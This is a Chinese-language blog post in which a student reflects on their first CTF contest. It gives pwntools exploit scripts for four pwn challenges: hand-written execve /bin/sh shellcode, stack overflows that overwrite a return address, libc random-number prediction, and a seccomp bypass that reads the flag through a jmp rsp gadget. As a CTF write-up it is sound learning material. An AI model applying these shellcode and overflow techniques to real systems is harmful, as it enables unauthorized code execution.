---
title: 第一场CTF比赛
description: 关于我的第一场CTF比赛
pubDatetime: 2023-04-15
ogImage: ../../assets/1.jpg
language: cn
tags: 
  - 网络安全
---
## 第一次参加CTF新生赛总结与反思
因为昨天学校那边要进行天梯模拟赛，所以被拉过去了。<br />16点30分结束，就跑回来宿舍开始写。<br />第一题和第二题一下子getshell，不用30分钟，可能我没想那么多，对比网上的WP，自己和他们有点不太一样，比较暴力。<br />大概17点10的时候，写第三题，可能自己第一次遇到随机数问题，我当时的想法是网上有没有随机数种子的工具，查了一下，还真有这个库。说明了pwntools库是个宝藏，自己平时应该抽空研究一下那个库，利用好他，成为一把好工具。<br />后面第三题，刚结束的时候，写出来了。其实思路没有错，就是自己的脚本写的时候，想让代码看起来可读性更高（可能以前写开发项目写习惯了，强迫症），然后多取了一次随机数，导致和远程那边不同步。后面不知道怎么的，把那个变量删了，就好了，当时傻逼了。<br />第四题知道是orw题目，目标是读flag，但是不会写shellcode。只能说，有思路，写不出，所以后面也应该提升自己的shellcode能力。不能只会写那种比较固定的shellcode。<br />虽然不知道其他人情况如何，但是自己第一次参加，接触pwn还没有一个月，学习反馈还是挺满意。<br />一路也遇到了很多师傅，结交很多朋友！继续努力！
## 比赛题目总结（核心，一定要学会shellcode！）
> PS：以下题目的保护权限都开得很少！！！
> 所以就不贴图checksec图片了！！！
> 要获得flag，本次比赛关键在于：会自己写简短的shellcode，会使用随机数库。

### Shellcode（编写短shell）
> 题目思路很简单，就是shellcode，不过长度有限制。
> 我是自己手改pwntools。

使用pwntools生成的，本质就是执行/* execve(path='/bin///sh', argv=['sh'], envp=0) */
```python
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
```
那么开始手搓，搞定！
> 注意，32位是int0x80，64位是syscall

```python

shellcode='''
mov rbx, 0x68732f6e69622f  
push rbx
push rsp 
pop rdi
xor esi, esi               
xor edx, edx            
push 0x3b
pop rax
syscall
'''
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1681727777007-a60311bc-38b1-4da3-94dc-fddf9e9e4f8d.png#averageHue=%23060403&clientId=uddbdf830-9bbd-4&from=paste&height=319&id=udd613c04&originHeight=479&originWidth=1274&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=53472&status=done&style=none&taskId=u039c4f2f-78df-4a74-ad8d-78661bc973a&title=&width=849.3333333333334)
```python
from pwn import *
context(log_level = 'debug',arch ='amd64',os = 'linux')
#io = process('./pwn2')
io = remote('node6.anna.nssctf.cn',28961)
io.recvuntil(b'Please.')

shellcode='''
mov rbx, 0x68732f6e69622f  
push rbx
push rsp 
pop rdi
xor esi, esi               
xor edx, edx            
push 0x3b
pop rax
syscall
'''

io.sendline(asm(shellcode))

io.recvuntil(b"start!")

payload =  b'a' * (0xa + 8 ) + p64(0x6010A0)

io.sendline(payload)

io.interactive()
```
### EASY PWN（直接暴力）
> 不用想那么多，直接随便输入垃圾数据即可
> 因为只要V5大于0就ok了，甚至偏移都不用想，直接乱输入
> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1681727698637-05acd4de-d886-421d-820b-aca7f36dea93.png#averageHue=%23040301&clientId=uddbdf830-9bbd-4&from=paste&height=700&id=u55b26be6&originHeight=1050&originWidth=1005&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=88239&status=done&style=none&taskId=u6e73728f-42a0-4f46-80b2-edd5976d13f&title=&width=670)

```python
from pwn import *
context(log_level = 'debug',arch ='amd64',os = 'linux')
#io = process('./easypwn')
io = remote('node6.anna.nssctf.cn',28962)
payload = b'\x00'
payload = payload.ljust(0x30,b'a')
io.sendline(payload)
#io.sendlineafter(b'Password:',payload)

io.interactive()
```
### 真男人下120层（随机数库）
> 第一次认识，随机数这个库，然后没有什么难的
> 暴力循环120次即可
> 感觉一点都不pwn
> 注意脚本编写时候，别自作多情多取一次
> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1681727860579-93511b92-b3f9-454c-916a-3fcde4b6a841.png#averageHue=%23040201&clientId=uddbdf830-9bbd-4&from=paste&height=358&id=u8f80025a&originHeight=537&originWidth=1581&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=47424&status=done&style=none&taskId=uc5005af7-56fc-4133-bc4b-2ed1798a063&title=&width=1054)

```python
from  pwn import *
from  ctypes import *
#context(log_level = 'debug',arch ='amd64',os = 'linux')
#io = process('./bin')
io=remote('node6.anna.nssctf.cn',28130)
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

srand = libc.srand(libc.time(0))
srand = libc.srand(srand % 3 - 1522127470)
io.recvuntil('Floor')

for i in range(121):
     io.sendline(str(libc.rand( ) % 4 + 1).encode( ))

io.interactive()

```
### Random（绕沙箱加短脚本）
> 程序禁了 execv，没开 NX，有 ‘jmp rsp’ 这么一个 gadget，所以往栈上写的 shellcode 是可执行且能利用到的。
> 很明显，是要读flag
> 先用pwn生成一个cat
> 用ljust左对齐抬高到0x28
> 返回地址为jmp rsp
> 填充 asm('sub rsp,0x30;call rsp')
> 那么返回的时候，执行jmp rsp，即asm('sub rsp,0x30;call rsp')，然后cat flag
> 太妙了！！！第一次见到这样的！

```python
    jmp=0x40094E
    shellcode=asm(shellcraft.cat('flag'))
    shellcode=shellcode.ljust(0x28,b'\x00')
    payload=shellcode+p64(jmp)+asm('sub rsp,0x30;call rsp')
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1681727956589-d7bb4c33-467c-40a0-b3dc-8d8ee7bec955.png#averageHue=%23030202&clientId=uddbdf830-9bbd-4&from=paste&height=665&id=u244b8bdf&originHeight=998&originWidth=1331&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=82620&status=done&style=none&taskId=u2b5945ba-fda3-4f65-a5a9-5e6b8d3abc2&title=&width=887.3333333333334)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1681727966018-1eda846a-bdde-4eb1-b528-c36331666492.png#averageHue=%23070604&clientId=uddbdf830-9bbd-4&from=paste&height=142&id=u9f26ea37&originHeight=213&originWidth=838&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=17430&status=done&style=none&taskId=uabe194ae-9f33-4f93-b9bc-bb83889f606&title=&width=558.6666666666666)
```python
from pwn import *
from ctypes import *
context(os='linux',arch='amd64',log_level='debug')
io=remote('node5.anna.nssctf.cn',28933)
#io=process('./RANDOM')

libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
srand =  libc.srand(libc.time(0))

for i in range(100):
    io.sendlineafter('please input a guess num:',str(libc.rand( )%50).encode( ))
    io.recvline()
    jmp=0x40094E
    shellcode=asm(shellcraft.cat('flag'))
    shellcode=shellcode.ljust(0x28,b'\x00')
    payload=shellcode+p64(jmp)+asm('sub rsp,0x30;call rsp')
    io.send(payload)
    io.interactive()
```
